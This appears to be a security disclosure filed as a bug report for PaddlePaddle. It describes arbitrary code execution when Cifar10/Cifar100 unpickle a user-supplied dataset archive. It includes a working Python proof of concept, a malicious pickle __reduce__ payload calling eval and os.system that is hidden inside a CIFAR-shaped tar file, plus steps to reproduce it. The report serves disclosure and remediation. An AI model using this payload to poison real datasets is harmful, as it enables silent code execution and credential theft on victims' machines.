## 正文

### bug描述 Describe the Bug

- **Affected API:** `paddle.vision.datasets.Cifar10` / `paddle.vision.datasets.Cifar100`
- **Severity:** Critical
- **CVSS 3.1:** 8.8 (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
- **CWE:** CWE-502 Deserialization of Untrusted Data → CWE-94 Code Injection
- **Status:** Confirmed, working PoC on the released `paddlepaddle==3.3.0` wheel
- **Affected versions:** v3.3.0 release tag **and current `develop` HEAD** (verified)

### Affected Component
```
File: python/paddle/vision/datasets/cifar.py
  v3.3.0 : line 180
  develop: line 206   (verified present on develop HEAD)
Function: Cifar10._load_data
```

### Vulnerable Code
```python
def _load_data(self):
    self.data = []
    with tarfile.open(self.data_file, mode='r') as f:
        names = (each_item.name for each_item in f if self.flag in each_item.name)
        names = sorted(names)
        for name in names:
            batch = pickle.load(f.extractfile(name), encoding='bytes')   # <-- SINK
            ...
```
`self.flag` is `"data_batch"` (train) / `"test_batch"` (test), so any tar member whose name
contains that substring is unpickled. When the caller passes `data_file=`, the MD5 integrity
gate in `__init__` is skipped and the supplied archive is unpickled as-is.

### Root Cause
- Direct `pickle.load()` on archive contents with no `find_class` allow-list.
- No `RestrictedUnpickler` on the dataset path.
- The `data_file=` path performs no integrity/authenticity check.

### Proof of Concept (benign — end-to-end, within the Paddle framework)

The payload is intentionally benign: it writes a random proof token to a temp file and
**returns a valid CIFAR batch**, so the dataset loads and training proceeds normally
(silent RCE). A real attacker runs any command and returns the same valid batch.

```python
import io, os, pickle, tarfile, tempfile, uuid
import paddle
from paddle.vision.datasets import Cifar10

TOKEN = "CIFAR_RCE_" + uuid.uuid4().hex[:12]
MARKER = os.path.join(tempfile.gettempdir(), "paddle_cifar_rce_proof.txt")

class MaliciousBatch:
    def __reduce__(self):
        cmd = f"echo {TOKEN} > {MARKER}"
        code = ("__import__('os').system(%r) or "
                "{b'data': __import__('numpy').zeros((4,3072),dtype='uint8'), "
                "b'labels':[0,1,2,3]}" % cmd)
        return (eval, (code,))

# Attacker crafts an archive shaped exactly like cifar-10-python.tar.gz
work = tempfile.mkdtemp(); archive = os.path.join(work, "cifar-10-python.tar.gz")
blob = pickle.dumps(MaliciousBatch(), protocol=2)
with tarfile.open(archive, "w:gz") as tar:
    ti = tarfile.TarInfo("cifar-10-batches-py/data_batch_1"); ti.size = len(blob)
    tar.addfile(ti, io.BytesIO(blob))

# Victim runs an ordinary training data-load — RCE fires here:
ds = Cifar10(data_file=archive, mode="train", download=False)
print("dataset loaded, len =", len(ds), "| marker present:", os.path.exists(MARKER))
```

### How to Reproduce
1. `pip install paddlepaddle==3.3.0`
2. Save the PoC above as `exploit.py`.
3. Run `python exploit.py`.
4. Observe: the dataset loads without error (`len = 1`) **and** the marker file was created
   by the injected command — i.e. code executed during `Cifar10(data_file=...)`.

### Impact / Real-World Scenario
CIFAR "python version" archives are widely redistributed (mirrors, course material, Kaggle
bundles, internal artifact stores, offline clusters that pre-stage datasets and pass explicit
paths). A victim who points `Cifar10(data_file=...)` at any attacker-influenced archive gets:
- **Arbitrary code execution** with the victim's privileges (credential/SSH-key theft,
  persistence, lateral movement) — Confidentiality/Integrity/Availability all High.
- **Silent compromise:** the payload returns a valid batch, so training proceeds and nothing
  looks wrong.
- **Supply-chain amplification:** one poisoned dataset archive compromises every user who
  loads it.

### Suggested Remediation
- Prefer a non-pickle on-disk representation (raw arrays / `.npz`) for bundled datasets.
- Optionally verify a checksum even on the `data_file=` path.

### Environment
- PaddlePaddle 3.3.0 (CPU wheel) and `develop` HEAD (source verified)
- Python 3.12, Ubuntu 24.04
